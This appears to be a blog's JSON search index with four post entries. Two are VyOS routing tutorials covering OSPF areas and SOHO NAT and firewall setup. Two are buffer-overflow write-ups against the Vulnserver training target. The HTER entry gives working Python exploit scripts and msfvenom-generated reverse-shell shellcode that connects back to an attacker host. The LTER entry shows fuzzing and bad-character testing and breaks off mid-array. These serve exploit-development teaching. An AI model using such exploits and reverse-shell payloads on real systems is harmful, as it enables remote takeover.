[ { "title": "VyOS - OSPF Basic Network", "url": "/posts/VyOS-OSPF-I/", "categories": "Computer Networking", "tags": "VyOS, Networking, Routing, OSPF", "date": "2023-01-01 10:17:00 +0000", "snippet": "The following OSPF Network will be dissected within the length of this post:DiagramNetwork consists of 5 VyOS-powered routers, from which 4 connect to a central switch to which send all OSPF-related communication.R4, will be the exiting leg of the network into EDGE-RT, which will be the Autonomous System Border Router (ASBR) and redistribute the access towards the Internet within the OSPF Network.All other Routers will function as well for ABR Capabilities, connecting their respective within the backbone (area 0).OSPF Selects a Designated Router (DR) and a Backup Designated Router (BDR), this is determined by the protocol by the following list, from up to down, if the former is not found, it will check for the following, the Neighbor which has the largest value, becomes the DR, with the Neighbor that has the largest value, behind the DR, becomes the BDR: OSPF Priority Value Loopback IP Address Interface IP AddressThe following Loopbacks will be assigned R1 - 172.16.0.1 R2 - 172.16.0.2 R3 - 172.16.0.3 R4 - 172.16.0.4 EDGE-RT - 172.16.0.254Since R4 will have the highest Loopback IP Address within the Backbone area, such will become the DR, whereas R3, will become the BDR, and R1/R2 going to DROther state.Due to the Network being a “Broadcast” type, second timers will be 10 Hello, 40 Wait, 40 Dead, and DR/BDR Selections will be performed.Configurationvyos@R1:~$ show configuration commands | grep -vE 'ntp|syslog|login|conntrack|config-management|console|hw-id'set interfaces ethernet eth0 address '10.10.11.1/29'set interfaces ethernet eth1 address '10.10.10.1/29'set interfaces loopback lo address '172.16.0.1/32'set protocols ospf area 0 network '10.10.11.0/29'set protocols ospf area 0 network '172.16.0.1/32'set protocols ospf area 1 network '10.10.10.0/29'set service ssh port '22'set system host-name 'R1'vyos@R1:~$ vyos@R2:~$ show configuration commands | grep -vE 'ntp|syslog|login|conntrack|config-management|console|hw-id'set interfaces ethernet eth0 address '10.10.11.2/29'set interfaces ethernet eth1 address '10.10.10.9/29'set interfaces loopback lo address '172.16.0.2/32'set protocols ospf area 0 network '10.10.11.0/29'set protocols ospf area 0 network '172.16.0.2/32'set protocols ospf area 2 network '10.10.10.8/29'set service ssh port '22'set system host-name 'R2'vyos@R2:~$vyos@R3:~$ show configuration commands | grep -vE 'ntp|syslog|login|conntrack|config-management|console|hw-id'set interfaces ethernet eth0 address '10.10.11.3/29'set interfaces ethernet eth1 address '10.10.11.14/30'set interfaces ethernet eth1 address '10.10.10.17/29'set interfaces ethernet eth2 address '10.10.11.10/30'set interfaces loopback lo address '172.16.0.3/32'set protocols ospf area 0 network '10.10.11.0/29'set protocols ospf area 0 network '172.16.0.3/32'set protocols ospf area 3 network '10.10.10.16/29'set service ssh port '22'set system host-name 'R3'vyos@R3:~$vyos@R4:~$ show configuration commands | grep -vE 'ntp|syslog|login|conntrack|config-management|console|hw-id'set interfaces ethernet eth0 address '10.10.254.2/30'set interfaces ethernet eth1 address '10.10.11.4/29'set interfaces loopback lo address '172.16.0.4/32'set protocols ospf area 0 network '172.16.0.0/32'set protocols ospf area 0 network '10.10.11.0/29'set protocols ospf area 100 network '10.10.254.0/30'set service ssh port '22'set system host-name 'R4'vyos@R4:~$vyos@EDGE-RT:~$ show configuration commands | grep -vE 'ntp|syslog|login|conntrack|config-management|console|hw-id'set firewall group address-group Allowed-Networks-Towards-Internet address '10.10.10.0-10.10.10.32'set firewall group address-group Allowed-Networks-Towards-Internet address '10.10.11.0-10.10.11.16'set firewall group address-group Allowed-Networks-Towards-Internet address '10.10.254.0-10.10.254.2'set interfaces ethernet eth0 address '10.11.10.200/24'set interfaces ethernet eth1 address '10.10.254.1/30'set interfaces loopback lo address '172.16.0.254/32'set nat source rule 1 destination address '0.0.0.0/0'set nat source rule 1 outbound-interface 'eth0'set nat source rule 1 source group address-group 'Allowed-Networks-Towards-Internet'set nat source rule 1 translation address 'masquerade'set protocols ospf area 100 network '10.10.254.0/30'set protocols ospf area 100 network '10.11.10.0/24'set protocols ospf default-information originateset protocols ospf interface eth0 passive disableset protocols static route 0.0.0.0/0 next-hop 10.11.10.1set service ssh port '22'set system host-name 'EDGE-RT'vyos@EDGE-RT:~$NeighborsThe neighbor adjacencies are noticed to transition into their Complete status. R1vyos@R1:~$ show ip ospf neighbor Neighbor ID Pri State Up Time Dead Time Address Interface RXmtL RqstL DBsmL172.16.0.2 1 2-Way/DROther 1h53m09s 31.114s 10.10.11.2 eth0:10.10.11.1 0 0 0172.16.0.3 1 Full/Backup 1h53m08s 31.870s 10.10.11.3 eth0:10.10.11.1 0 0 0172.16.0.4 1 Full/DR 1h53m03s 34.132s 10.10.11.4 eth0:10.10.11.1 0 0 0vyos@R1:~$ R2vyos@R2:~$ show ip ospf neighbor Neighbor ID Pri State Up Time Dead Time Address Interface RXmtL RqstL DBsmL172.16.0.1 1 2-Way/DROther 1h53m21s 38.623s 10.10.11.1 eth0:10.10.11.2 0 0 0172.16.0.3 1 Full/Backup 1h53m26s 36.363s 10.10.11.3 eth0:10.10.11.2 0 0 0172.16.0.4 1 Full/DR 1h53m32s 38.623s 10.10.11.4 eth0:10.10.11.2 0 0 0vyos@R2:~$ R3vyos@R3:~$ show ip ospf neighbor Neighbor ID Pri State Up Time Dead Time Address Interface RXmtL RqstL DBsmL172.16.0.1 1 Full/DROther 1h53m34s 38.474s 10.10.11.1 eth0:10.10.11.3 0 0 0172.16.0.2 1 Full/DROther 1h53m41s 35.465s 10.10.11.2 eth0:10.10.11.3 0 0 0172.16.0.4 1 Full/DR 1h53m48s 38.474s 10.10.11.4 eth0:10.10.11.3 0 0 0vyos@R3:~$ R4vyos@R4:~$ show ip ospf neighbor Neighbor ID Pri State Up Time Dead Time Address Interface RXmtL RqstL DBsmL172.16.0.1 1 Full/DROther 1h53m46s 36.141s 10.10.11.1 eth1:10.10.11.4 0 0 0172.16.0.2 1 Full/DROther 1h54m00s 33.131s 10.10.11.2 eth1:10.10.11.4 0 0 0172.16.0.3 1 Full/Backup 1h54m00s 33.879s 10.10.11.3 eth1:10.10.11.4 0 0 0172.16.0.254 1 Full/DR 1h54m25s 34.790s 10.10.254.1 eth0:10.10.254.2 0 0 0vyos@R4:~$ EDGE-RTvyos@EDGE-RT:~$ show ip ospf neighbor Neighbor ID Pri State Up Time Dead Time Address Interface RXmtL RqstL DBsmL172.16.0.4 1 Full/Backup 1h54m36s 35.381s 10.10.254.2 eth1:10.10.254.1 0 0 0vyos@EDGE-RT:~$ Within EDGE-R1, we can see as well Inter-Zone routes which have been advertised.vyos@EDGE-RT:~$ show ip route Codes: K - kernel route, C - connected, S - static, R - RIP, O - OSPF, I - IS-IS, B - BGP, E - EIGRP, N - NHRP, T - Table, v - VNC, V - VNC-Direct, A - Babel, F - PBR, f - OpenFabric, &gt; - selected route, * - FIB route, q - queued, r - rejected, b - backup t - trapped, o - offload failureS&gt;* 0.0.0.0/0 [1/0] via 10.11.10.1, eth0, weight 1, 02:17:47O&gt;* 10.10.10.0/29 [110/3] via 10.10.254.2, eth1, weight 1, 01:55:08O&gt;* 10.10.10.8/29 [110/3] via 10.10.254.2, eth1, weight 1, 01:55:31O&gt;* 10.10.10.16/29 [110/3] via 10.10.254.2, eth1, weight 1, 01:55:38O&gt;* 10.10.11.0/29 [110/2] via 10.10.254.2, eth1, weight 1, 01:55:43O 10.10.254.0/30 [110/1] is directly connected, eth1, weight 1, 01:56:10C&gt;* 10.10.254.0/30 is directly connected, eth1, 01:56:43O&gt;* 172.16.0.1/32 [110/2] via 10.10.254.2, eth1, weight 1, 01:55:08O&gt;* 172.16.0.2/32 [110/2] via 10.10.254.2, eth1, weight 1, 01:55:31O&gt;* 172.16.0.3/32 [110/2] via 10.10.254.2, eth1, weight 1, 01:55:43C&gt;* 172.16.0.254/32 is directly connected, lo, 02:17:50O 10.11.10.0/24 [110/1] is directly connected, eth0, weight 1, 02:17:46C&gt;* 10.11.10.0/24 is directly connected, eth0, 02:17:50vyos@EDGE-RT:~$ show ip ospf route ============ OSPF network routing table ============N IA 10.10.10.0/29 [3] area: 0.0.0.100 via 10.10.254.2, eth1N IA 10.10.10.8/29 [3] area: 0.0.0.100 via 10.10.254.2, eth1N IA 10.10.10.16/29 [3] area: 0.0.0.100 via 10.10.254.2, eth1N IA 10.10.11.0/29 [2] area: 0.0.0.100 via 10.10.254.2, eth1N 10.10.254.0/30 [1] area: 0.0.0.100 directly attached to eth1N IA 172.16.0.1/32 [2] area: 0.0.0.100 via 10.10.254.2, eth1N IA 172.16.0.2/32 [2] area: 0.0.0.100 via 10.10.254.2, eth1N IA 172.16.0.3/32 [2] area: 0.0.0.100 via 10.10.254.2, eth1N 10.11.10.0/24 [1] area: 0.0.0.100 directly attached to eth0============ OSPF router routing table =============R 172.16.0.4 [1] area: 0.0.0.100, ABR via 10.10.254.2, eth1============ OSPF external routing table ===========vyos@EDGE-RT:~$ The ‘default-information originate’ command will redistribute the static route towards the Internet, issued by EDGE-RT into the OSPF network.vyos@R1:~$ show ip routeCodes: K - kernel route, C - connected, S - static, R - RIP, O - OSPF, I - IS-IS, B - BGP, E - EIGRP, N - NHRP, T - Table, v - VNC, V - VNC-Direct, A - Babel, F - PBR, f - OpenFabric, &gt; - selected route, * - FIB route, q - queued, r - rejected, b - backup t - trapped, o - offload failureO&gt;* 0.0.0.0/0 [110/10] via 10.10.11.4, eth0, weight 1, 01:54:27O 10.10.10.0/29 [110/1] is directly connected, eth1, weight 1, 01:54:42C&gt;* 10.10.10.0/29 is directly connected, eth3, 02:22:01O&gt;* 10.10.10.8/29 [110/2] via 10.10.11.2, eth0, weight 1, 01:54:28O&gt;* 10.10.10.16/29 [110/2] via 10.10.11.3, eth0, weight 1, 01:54:28O 10.10.11.0/29 [110/1] is directly connected, eth0, weight 1, 01:54:28C&gt;* 10.10.11.0/29 is directly connected, eth0, 02:22:02O&gt;* 10.10.254.0/30 [110/2] via 10.10.11.4, eth0, weight 1, 01:54:28O 172.16.0.1/32 [110/0] is directly connected, lo, weight 1, 01:54:42C&gt;* 172.16.0.1/32 is directly connected, lo, 02:22:02O&gt;* 172.16.0.2/32 [110/1] via 10.10.11.2, eth0, weight 1, 01:54:28O&gt;* 172.16.0.3/32 [110/1] via 10.10.11.3, eth0, weight 1, 01:54:28O&gt;* 10.11.10.0/24 [110/3] via 10.10.11.4, eth0, weight 1, 01:54:28vyos@R1:~$ show ip ospf route ============ OSPF network routing table ============N 10.10.10.0/29 [1] area: 0.0.0.1 directly attached to eth1N IA 10.10.10.8/29 [2] area: 0.0.0.0 via 10.10.11.2, eth0N IA 10.10.10.16/29 [2] area: 0.0.0.0 via 10.10.11.3, eth0N 10.10.11.0/29 [1] area: 0.0.0.0 directly attached to eth0N IA 10.10.254.0/30 [2] area: 0.0.0.0 via 10.10.11.4, eth0N 172.16.0.1/32 [0] area: 0.0.0.0 directly attached to loN 172.16.0.2/32 [1] area: 0.0.0.0 via 10.10.11.2, eth0N 172.16.0.3/32 [1] area: 0.0.0.0 via 10.10.11.3, eth0N IA 10.11.10.0/24 [3] area: 0.0.0.0 via 10.10.11.4, eth0============ OSPF router routing table =============R 172.16.0.2 [1] area: 0.0.0.0, ABR via 10.10.11.2, eth0R 172.16.0.3 [1] area: 0.0.0.0, ABR via 10.10.11.3, eth0R 172.16.0.4 [1] area: 0.0.0.0, ABR via 10.10.11.4, eth0R 172.16.0.254 IA [2] area: 0.0.0.0, ASBR via 10.10.11.4, eth0============ OSPF external routing table ===========N E2 0.0.0.0/0 [3/10] tag: 0 via 10.10.11.4, eth0vyos@R1:~$ TracesPC1&gt; trace 10.10.10.18 -P 6trace to 10.10.10.18, 8 hops max (TCP), press Ctrl+C to stop 1 10.10.10.1 0.880 ms 0.492 ms 0.748 ms 2 10.10.11.3 1.494 ms 1.708 ms 1.110 ms 3 10.10.10.18 5.302 ms 2.103 ms 1.671 msPC1&gt; PC1&gt; trace 10.10.254.1 -P 6trace to 10.10.254.1, 8 hops max (TCP), press Ctrl+C to stop 1 10.10.10.1 3.082 ms 2.157 ms 27.972 ms 2 10.10.11.4 1.342 ms 1.221 ms 0.932 ms 3 10.10.254.1 8.937 ms 3.047 ms 3.442 msPC1&gt; vyos@R1:~$ traceroute 10.10.10.10traceroute to 10.10.10.10 (10.10.10.10), 30 hops max, 60 byte packets 1 10.10.11.2 (10.10.11.2) 2.157 ms 2.100 ms 0.413 ms 2 10.10.10.10 (10.10.10.10) 1.916 ms 1.433 ms 1.378 msvyos@R1:~$" }, { "title": "VyOS - Basic SOHO Set-Up", "url": "/posts/VyOS-SOHO/", "categories": "Computer Networking", "tags": "VyOS, Networking, SOHO", "date": "2022-12-31 10:17:00 +0000", "snippet": "The purpose of this Blog Post is to detail a brief overview in a simplistic SOHO Network, with a VyOS powered Firewall/Router as Internet Gateway to cover basics of VyOS. VyOS is an Open-Source Router will Firewall capacilities which is based under Linux/GNU Operating System. Due to being based in Linux, many UNIX/BSD-Commands are completely compatible, making this an excellent option in case additional capabilities beyond routing and firewall are required, providing more flexiblity.DesignThe Diagram of the Network will be the following:As aforementioned, not an overly-complex set-up:The Network will be composed by two Subnets by a Supernet of 10.10.10.0/28: 10.10.10.0/29 10.10.10.8/29ImplementationTo enter in configuration mode for VyOS, we need to use the command “configure”:vyos@vyossohort:~$ configureRequired commands would be the following:vyos@vyossohort# set firewall all-ping 'enable'vyos@vyossohort# set firewall group address-group Office address '10.10.10.0-10.10.10.16'vyos@vyossohort# set firewall interface eth0 out name 'Internet-Browsing'vyos@vyossohort# set firewall name Internet-Browsing rule 1 action 'accept'vyos@vyossohort# set firewall name Internet-Browsing rule 1 destination address '0.0.0.0/0'vyos@vyossohort# set firewall name Internet-Browsing rule 1 log 'enable'vyos@vyossohort# set firewall name Internet-Browsing rule 1 outbound-interface 'eth0'vyos@vyossohort# set firewall name Internet-Browsing rule 1 source group address-group 'Office'vyos@vyossohort# set interfaces ethernet eth0 address '10.10.11.200/24'vyos@vyossohort# set interfaces ethernet eth2 address '10.10.10.1/29'vyos@vyossohort# set interfaces ethernet eth3 address '10.10.10.9/29'vyos@vyossohort# set nat source rule 1 destination address '0.0.0.0/0'vyos@vyossohort# set nat source rule 1 logvyos@vyossohort# set nat source rule 1 outbound-interface 'eth0'vyos@vyossohort# set nat source rule 1 source group address-group 'Office'vyos@vyossohort# set nat source rule 1 translation address 'masquerade'vyos@vyossohort# set protocols static route 0.0.0.0/0 next-hop 10.10.11.1vyos@vyossohort# set system name-server '10.10.11.1'To commit the required changes to the running configuration, the following command is set:vyos@vyossohort# commitTo save the required changes once it is confirmed that the changes are working as proper, the following command is issued:vyos@vyossohort# saveTestingvyos@vyossohort:~$ ping google.com count 3PING google.com (142.251.134.78) 56(84) bytes of data.64 bytes from eze10s11-in-f14.1e100.net (142.251.134.78): icmp_seq=1 ttl=116 time=8.79 ms64 bytes from eze10s11-in-f14.1e100.net (142.251.134.78): icmp_seq=2 ttl=116 time=8.28 ms64 bytes from eze10s11-in-f14.1e100.net (142.251.134.78): icmp_seq=3 ttl=116 time=10.1 msvyos@vyossohort:~$ ping 10.10.10.2 count 5 &amp;&amp; ping 10.10.10.9 count 5PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.295 ms64 bytes from 10.10.10.2: icmp_seq=2 ttl=64 time=0.944 ms64 bytes from 10.10.10.2: icmp_seq=3 ttl=64 time=0.856 ms64 bytes from 10.10.10.2: icmp_seq=4 ttl=64 time=0.680 ms64 bytes from 10.10.10.2: icmp_seq=5 ttl=64 time=1.12 ms--- 10.10.10.2 ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4013msrtt min/avg/max/mdev = 0.295/0.778/1.116/0.279 msPING 10.10.10.9 (10.10.10.9) 56(84) bytes of data.64 bytes from 10.10.10.9: icmp_seq=1 ttl=64 time=0.043 ms64 bytes from 10.10.10.9: icmp_seq=2 ttl=64 time=0.064 ms64 bytes from 10.10.10.9: icmp_seq=3 ttl=64 time=0.051 ms64 bytes from 10.10.10.9: icmp_seq=4 ttl=64 time=0.089 ms64 bytes from 10.10.10.9: icmp_seq=5 ttl=64 time=0.045 ms--- 10.10.10.9 ping statistics ---5 packets transmitted, 5 received, 0% packet loss, time 4127msrtt min/avg/max/mdev = 0.043/0.058/0.089/0.016 msvyos@vyossohort:~$ We can perform traces accross the network:PC1&gt; trace 10.10.10.10 -P 6trace to 10.10.10.10, 8 hops max (TCP), press Ctrl+C to stop 1 10.10.10.1 1.083 ms 0.381 ms 0.847 ms 2 10.10.10.10 0.963 ms 0.951 ms 1.080 msPC1&gt; The Flow of the traffic can be monitored as well, since this is Linux based, this would be actually an alias for tcpdump.vyos@vyossohort:~$ monitor traffic interface eth2 filter '(host 10.10.10.2 and host 10.10.10.10)'tcpdump: verbose output suppressed, use -v[v]... for full protocol decodelistening on eth2, link-type EN10MB (Ethernet), snapshot length 262144 bytes20:02:46.844496 IP 10.10.10.2.39985 &gt; 10.10.10.10.39986: Flags [S], seq 1672516966, win 0, options [mss 1460,nop,nop,TS val 1672516966 ecr 0,nop,wscale 1], length 020:02:46.846443 IP 10.10.10.2.39985 &gt; 10.10.10.10.39986: Flags [S], seq 1672516966, win 0, options [mss 1460,nop,nop,TS val 1672516966 ecr 0,nop,wscale 1], length 020:02:46.847637 IP 10.10.10.2.39985 &gt; 10.10.10.10.39986: Flags [S], seq 1672516966, win 0, options [mss 1460,nop,nop,TS val 1672516966 ecr 0,nop,wscale 1], length 020:02:46.849537 IP 10.10.10.2.39985 &gt; 10.10.10.10.39986: Flags [S], seq 1672516966, win 0, options [mss 1460,nop,nop,TS val 1672516966 ecr 0,nop,wscale 1], length 020:02:46.851304 IP 10.10.10.10.39986 &gt; 10.10.10.2.39985: Flags [S.], seq 1399269850, ack 1672516967, win 0, length 020:02:46.852688 IP 10.10.10.2.39985 &gt; 10.10.10.10.39986: Flags [S], seq 1672516966, win 0, options [mss 1460,nop,nop,TS val 1672516966 ecr 0,nop,wscale 1], length 020:02:46.853244 IP 10.10.10.10.39986 &gt; 10.10.10.2.39985: Flags [S.], seq 991021594, ack 1672516967, win 0, length 020:02:46.854542 IP 10.10.10.2.39985 &gt; 10.10.10.10.39986: Flags [S], seq 1672516966, win 0, options [mss 1460,nop,nop,TS val 1672516966 ecr 0,nop,wscale 1], length 020:02:46.855130 IP 10.10.10.10.39986 &gt; 10.10.10.2.39985: Flags [S.], seq 1453153323, ack 1672516967, win 0, length 0" }, { "title": "Vulnserver HTER - Vanilla BOF & Character Conversion", "url": "/posts/Vulnserver-HTER/", "categories": "Binary Exploitation", "tags": "shellcoding, vulnerability", "date": "2021-02-03 03:33:00 +0000", "snippet": "IntroductionIn order to finish with the eccentric cases that vulnserver may offer us, today we will be seeing an odd case of a buffer overflow with a character conversion.The issue itselfDue to the character conversion, the received bytes are parsed as expected. Nonetheless, the alphanumeric bytes suffer from no change whatsoever and are not ported as hex.For example, if the EIP is overflown with 1000 bytes of A’s, the EIP may not reveal 41414141, instead, it will place “AAAAAAAA”.The basicsAs with any other vulnerable applicaiton to, so as to achieve a buffer overflow, we shall test it first in order to exploit it, let’s try with HTER + long string of bytes.PoC code:import socket, syshost = sys.argv[1]buffer = \"HTER \" + \"A\" * 5000s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Crash I.Gaze at the EIP for a bit, look how instead of converting the sent bytes into hex (41), it just parsed them as how they went dispatched.As there is no pattern available in order to obtain the offset on these scenarios, the best method is to deduce the offset manually with the use of an elimination process.PoC code:import socket, syshost = sys.argv[1]buffer = \"HTER \" + \"A\" * 2000 + \"B\" * 1000 + \"C\" * 1000s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Crash II.As displayed, it appears as now the B’s are the culprit for the overflow. After this process was replicated on multiple occasions, it was found for the offset to be 2041.Furthermore, in order to overwrite the EIP, it is needed to cover the extra space that the opcodes commonly occupy, meaning that it is required to send 8 B’s, instead of 4.PoC code:import socket, syshost = sys.argv[1]buffer = \"HTER \" + \"A\" * 2041 + \"BBBBBBBB\" + \"FF\" * 200s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Crash III.Hijacking the execution.As with any other buffer overflow, it is now essential to find an address with a JMP ESP instruction, which will allow us to execute any type of code with no restrictionswhatsoever.Enumerating the modules.Hunting for the required instruction.Now that the vital address has been already acquired, it can’t just be placed as we always did, with struct or a hex escape sequence (\\x). Instead, it must be placed onreverse, just without the aforementioned hexadecimal condition. For example, instead of sending \\x41\\x49, 4149 is chosen.PoC code:import socket, syshost = sys.argv[1]jmpesp = \"AF115062\" # 625011AFbuffer = \"HTER \" + \"A\" * 2041 + jmpesp + \"FF\" * 200s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Crash IV.Good, as we now have access to execution, the following step would be generating shellcode, but following what was seen on the last crash. In order to make our shellcodeusable, the format “hex” will be employed.Generating shellcoderoot@whitecr0wz:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f hex -b \"\\x00\" EXITFUNC=thread [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadFound 11 compatible encodersAttempting to encode payload with 1 iterations of x86/shikata_ga_naix86/shikata_ga_nai succeeded with size 351 (iteration=0)x86/shikata_ga_nai chosen with final size 351Payload size: 351 bytesFinal size of hex file: 702 bytesb8cb420fe4daced97424f45b31c9b1523143120343128320beed114ad770d9b2281553571915071c0aa54370a74e01603c228e87f589e8a606a1c9a984b81d09b4725048f16f9918aae40c8cdfb18c27935495d46456b44bfe01166ad3391f743007e90f82f3e8d9dafc4724d30e9961d4f0ec9b268cf658544a727afe1924a6feceb32d0cbab069113d14022db69bc4a78cbfc0ec57a1514939de8132e67acadff3f691b7303b29485f4c5a7ac0e6f43689200338a0959bc74be6b2031fb6aca2205d2c4af5f27ce4a6b22c44175b264b487b4981e116b042ce4fde19a68d1e3d1f1bf82b4f4d53c4f6d42f75f6c24ab57ce1ab78758cbfed75db9db88af18927189e492101091e66f740ca9aaefae86636c4a8bc8bcb3130b7ef218c38b415406f62c326d9c4bdf0b68e2984f4102f89d0e6cf388dbef0f5593789ebf9b840a81a5b40c5b2c20164dff4fcabe676f4531d667d5159206e2bf2c59098f3cfroot@whitecr0wz:~# Final PoC:import socket, syshost = sys.argv[1]buf = \"b8cb420fe4daced97424f45b31c9b1523143120343128320beed114ad770d9b2281553571915071c0aa54370a74e01603c228e87f589e8a606a1c9a984b81d09b4725048f16f9918aae40c8cdfb18c27935495d46456b44bfe01166ad3391f743007e90f82f3e8d9dafc4724d30e9961d4f0ec9b268cf658544a727afe1924a6feceb32d0cbab069113d14022db69bc4a78cbfc0ec57a1514939de8132e67acadff3f691b7303b29485f4c5a7ac0e6f43689200338a0959bc74be6b2031fb6aca2205d2c4af5f27ce4a6b22c44175b264b487b4981e116b042ce4fde19a68d1e3d1f1bf82b4f4d53c4f6d42f75f6c24ab57ce1ab78758cbfed75db9db88af18927189e492101091e66f740ca9aaefae86636c4a8bc8bcb3130b7ef218c38b415406f62c326d9c4bdf0b68e2984f4102f89d0e6cf388dbef0f5593789ebf9b840a81a5b40c5b2c20164dff4fcabe676f4531d667d5159206e2bf2c59098f3cf\"jmpesp = \"AF115062\" # 625011AFbuffer = \"HTER \" + \"A\" * 2041 + jmpesp + \"90\" * 20 + buf + \"FF\" * 200s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()EndGame" }, { "title": "Vulnserver LTER - SEH Extremely restricted character set", "url": "/posts/Vulnserver-LTER/", "categories": "Binary Exploitation", "tags": "assembly, shellcoding, vulnerability", "date": "2021-02-02 05:44:00 +0000", "snippet": "IntroductionLast time i blogged, we tackled aligning registers within windows exploit development. Today we will be seeing an example on the vulnerable server by stephen bradshaw, in which, a restricted set of characters may be found. Furthermore, due to lack of executable space when leading the flow, it will be required to use additional techniques to successfully exploit the server.The basics once againAs with any other vulnerable applicaiton to a buffer overflow, we need to test it first in order to exploit it.PoC code:import socket, sys, structbuffer = \"LTER /.:/\" + \"A\" * 5000host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Response of the SEH ChainAs with any other buffer overflow, the next step is to use a pattern in order to find the offset through the cyclic pattern.root@whitecr0wz:~/Exploit-Dev/LTER# msf-pattern_create -l 5000 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab . . .Response of the SEH ChainWith the value 0x326E4531, the offset is found.root@whitecr0wz:~/Exploit-Dev/LTER# msf-pattern_offset -q 326E4531 [*] Exact match at offset 3515root@whitecr0wz:~/Exploit-Dev/LTER# Due to the fact that now we know the offset, we can check if the control of the nseh &amp; seh register was obtained.PoC code:import socket, sys, structbuffer = \"LTER /.:/\" + \"A\" * 3515 + \"BBBB\" + \"CCCC\" + \"\\xff\" * 200host = sys.argv[1]s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, 9999))s.send(buffer)s.close()Response of the SEH ChainWhere the fun begins!Let’s check for any bad characters that may hurt our shellcode, shall we?List of bad charactersbadchars = (\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\"\"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\"\"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\"\"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\"\"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\"\"\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")In order to analyze it, the bad characters shall be sent after the 4 bytes of C’s.PoC code:import socket, sys, structbadchars = (\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\"\"\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\"\"\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\"\"\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\"\"\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\"\"\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\